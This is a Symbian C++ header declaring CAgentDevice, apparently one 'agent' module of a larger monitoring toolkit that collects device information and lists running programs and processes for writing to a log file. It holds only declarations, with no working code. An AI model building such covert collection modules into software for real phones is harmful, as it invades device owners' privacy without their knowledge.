/*
 * AgentDevice.h
 *
 *  Created on: 10/set/2010
 *      Author: Giovanna
 */

#ifndef AGENTDEVICE_H_
#define AGENTDEVICE_H_

// INCLUDES

#include "AbstractAgent.h"
#include <HT\Phone.h>
#include <HT\Logging.h>
#include <e32des16.h>
#include <Etel3rdParty.h>

// CLASS DECLARATION

/**
 *  CAgentDevice
 * 
 */
class CAgentDevice : public CAbstractAgent
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentDevice();

	/**
	 * Two-phased constructor.
	 */
	static CAgentDevice* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentDevice* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:
	// From MTimeOutNotifier
    // virtual void TimerExpiredL(TAny* src);
    
    /**
	 * Constructor for performing 1st stage construction
	 */
	CAgentDevice();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	/**
	 * Get device information.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8*  GetInfoBufferL();

private:
	TBool iList;	// list programs and processes on device
	CPhone*	iPhone;   
	__FLOG_DECLARATION_MEMBER
	};


#endif /* AGENTDEVICE_H_ */
